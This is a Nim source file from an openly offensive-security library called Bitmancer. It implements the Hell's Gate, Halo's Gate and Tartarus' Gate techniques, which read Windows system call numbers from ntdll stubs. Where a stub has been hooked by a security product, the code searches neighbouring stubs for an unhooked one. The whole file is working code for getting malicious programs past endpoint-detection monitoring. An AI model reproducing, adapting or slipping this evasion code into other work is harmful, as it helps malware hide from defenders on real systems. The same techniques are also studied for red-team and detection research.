##---------------------------------------------------------------------
##      Bitmancer - a library for Offensive Security Development 
##           
##          Copyright (C) 2022  B. Marshall (zimawhite1@gmail.com)
##
##  This program is free software: you can redistribute it and/or modify
##  it under the terms of the GNU General Public License as published by
##  the Free Software Foundation, either version 3 of the License, or
##  (at your option) any later version.
##
##  This program is distributed in the hope that it will be useful,
##  but WITHOUT ANY WARRANTY; without even the implied warranty of
##  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##  GNU General Public License for more details.
##
##  You should have received a copy of the GNU General Public License
##  along with this program.  If not, see <https://www.gnu.org/licenses/>.
## 
##----------------------------------------------------------------------------------

import
    base

export
    base

## SSN "gate" retrieval implementations (with some small differences)
##------------------------------------------------------------------------

## Hell's Gate 
##------------------------------------
func bHellsGateParse(pFunction: PVOID): SyscallResult =
    var index = WORD(0)
    while true:
        ## check if syscall, in this case we are too far
        if cast[PBYTE](pFunction +! index)[] == 0x0F and cast[PBYTE](pFunction +! (index+1))[] == 0x05:
            return err SyscallNotFound
        ## check if ret, in this case we are also probaly too far
        if cast[PBYTE](pFunction +! index)[] == 0xC3:
            return err SyscallNotFound
        ## check for SSN
        if (result = checkStub(pFunction, DWORD(index), false); result.isOk()):
            return
        inc index

proc bHellsGateEat*(imageBase: ModuleHandle, ident: SomeProcIdent): SyscallResult =
    let pFunc = ? getProcAddress(imageBase, ident)
    bHellsGateParse(pFunc)

proc bHellsGateIat*(imageBase, importBase: ModuleHandle, ident: SomeThunkedIdent): SyscallResult =
    let pFunc = ? getProcAddressEx(imageBase, importBase, ident)
    bHellsGateParse(pFunc)

## Halo's Gate 
##------------------------------------
func bHalosGateParse(pFunction: PVOID): SyscallResult =
    ## check for SSN
    if (result = checkStub(pFunction, 0, false); result.isOk()):
        return
    ## if hooked, check the neighborhood to find clean syscall
    if cast[PBYTE](pFunction)[] == 0xE9:
        for i in 0 ..< 500:
            ## check neighboring syscall down
            if (result = checkStub(pFunction, DWORD(i * StubOffsetDown), true); result.isOk()):
                return
            ## check neighboring syscall up
            if (result = checkStub(pFunction, DWORD(i * StubOffsetUp), true); result.isOk()):
                return

proc bHalosGateEat*(imageBase: ModuleHandle, ident: SomeProcIdent): SyscallResult =
    let pFunc = ? getProcAddress(imageBase, ident)
    bHalosGateParse(pFunc)

proc bHalosGateIat*(imageBase, importBase: ModuleHandle, ident: SomeThunkedIdent): SyscallResult =
    let pFunc = ? getProcAddressEx(imageBase, importBase, ident)
    bHalosGateParse(pFunc)

## Tartarus' Gate 
##------------------------------------
func bTartarusGateParse(pFunction: PVOID): SyscallResult =
    if (result = bHalosGateParse(pFunction); result.isOk()):
        return
    ## if hooked after `mov r10, rcx`, check the neighborhood to find clean syscall
    if cast[PBYTE](pFunction +! 3)[] == 0xE9:
        for i in 0 ..< 500:
            ## check neighboring syscall down
            if (result = checkStub(pFunction, DWORD(i * StubOffsetDown), true); result.isOk()):
                return
            ## check neighboring syscall up
            if (result = checkStub(pFunction, DWORD(i * StubOffsetUp), true); result.isOk()):
                return

proc bTartarusGateEat*(imageBase: ModuleHandle, ident: SomeProcIdent): SyscallResult =
    let pFunc = ? getProcAddress(imageBase, ident)
    bTartarusGateParse(pFunc)

proc bTartarusGateIat*(imageBase, importBase: ModuleHandle, ident: SomeThunkedIdent): SyscallResult =
    let pFunc = ? getProcAddressEx(imageBase, importBase, ident)
    bTartarusGateParse(pFunc)
